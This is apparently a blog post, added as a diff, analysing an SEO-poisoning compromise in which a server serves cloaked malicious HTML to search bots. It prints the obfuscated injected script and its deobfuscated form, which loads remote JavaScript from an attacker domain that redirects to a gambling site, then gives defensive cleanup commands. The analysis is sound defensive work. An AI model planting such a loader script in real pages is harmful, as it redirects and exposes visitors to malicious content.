@@ -1,0 +1,118 @@
+---
+title: 'SEO Poisoning'
+date: '2025-08-10'
+tags: ['SEO-POISONING']
+draft: false
+summary: 'SEO Poisoning is an attack designed to manipulate search engine algorithms, promoting malicious pages to appear in top positions in search results.'
+images: ['/static/images/seo-poisoning-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/seo-poisoning-images/default.png)
+
+---
+
+# SEO Poisoning
+
+It has been identified that the subdomain `REDACTED` is being used for SEO poisoning and redirecting visitors (especially indexing bots such as Googlebot) to gambling sites and malicious content.
+The legitimate page is replaced by malicious HTML only when access is detected to be coming from a search engine bot.
+
+SEO Poisoning is an attack designed to manipulate search engine algorithms, promoting malicious pages to appear in top positions in search results.
+
+---
+
+## Analysis
+
+By performing a Google search for the domain `REDACTED`, it was possible to see that it is indexing several suspicious sites, mainly related to gambling:
+
+```bash
+site:https://REDACTED
+```
+
+![seopoisoning](/static/images/seo-poisoning-images/image.png)
+
+Accessing the URL and capturing the request using a proxy (BurpSuite), it was possible to identify the execution of an obfuscated script:
+
+![seopoisoning 1](/static/images/seo-poisoning-images/image5.png)
+
+![seopoisoning 3](/static/images/seo-poisoning-images/image3.png)
+
+```bash
+<script>eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--) {d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]) {p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('9.8("<0 7=\\"6://5.4.3/2.1\\"> </0>");',10,10,'script|js|brxxx|xyz|openconf|july|hxxps|src|write|document'.split('|'),0,{})) </script>
+```
+
+Após realizar a desofuscação, verificou-se que o código redireciona para a URL `hxxps://july.openconf[.]xyz/brxxx.js` :
+
+```bash
+document.write("<script src=\"hxxps://july.openconf.xyz/brxxx.js\"></script>");
+```
+
+Accessing the URL revealed that the **brxxx.js** JavaScript file redirects the user to the malicious site `hxxps://9d[.]bet[.]br/?dt142s01`, in addition to loading external tracking SDKs and executing other suspicious scripts.
+![seopoisoning 4](/static/images/seo-poisoning-images/image4.png)
+
+---
+
+## SEO Poisoning Confirmation
+
+When the URL is accessed directly, the server returns a 404 error. However, when the same page is accessed via Google, it redirects to the malicious page.
+
+This happens because, during Google’s indexing process, the server delivers an altered (malicious) HTML instead of the legitimate content. This technique is also known as Cloaking.
+
+The simulation was carried out as follows:
+
+**Simulating Googlebot access:**
+
+```bash
+curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" https://REDACTED
+```
+
+![seopoisoning 1](/static/images/seo-poisoning-images/image1.png)
+
+**Normal access:**
+
+```bash
+curl https://REDACTED
+```
+
+![seopoisoning 2](/static/images/seo-poisoning-images/image2.png)
+
+---
+
+## Conclusion
+
+Based on the evidence presented, there are strong indications that the server has been compromised and is being used to spread malicious content, especially through **SEO poisoning**, to redirect visitors and indexing bots to gambling sites and other potentially dangerous pages.
+
+---
+
+## Recommendations
+
+- Locate infected files by searching directly for the identified malicious script pattern:
+
+```bash
+grep -R "eval(function(p,a,c,k,e,d)" /var/www/ 2>/dev/null
+```
+
+OBS: Note: Adjust **/var/www/** to the actual application path on the server.
+
+- Search for direct references to the malicious URL:
+
+```bash
+grep -R "july.openconf.xyz" /var/www/ 2>/dev/null
+```
+
+- Check for persistence via suspicious scheduled tasks:
+
+```bash
+cat /etc/crontab
+crontab -l
+```
+
+- Check for suspicious connections and processes:
+
+```bash
+ps aux
+ss -tulnp
+```
+
+- Monitor suspicious processes using the pspy tool (https://github.com/DominicBreuker/pspy) to identify automated executions, backdoors, or rootkits that may reactivate the malicious code after cleanup.
+- Block the malicious URL `july.openconf[.]xyz` in the firewall, proxy, or IDS to prevent reinfection and new payload downloads.
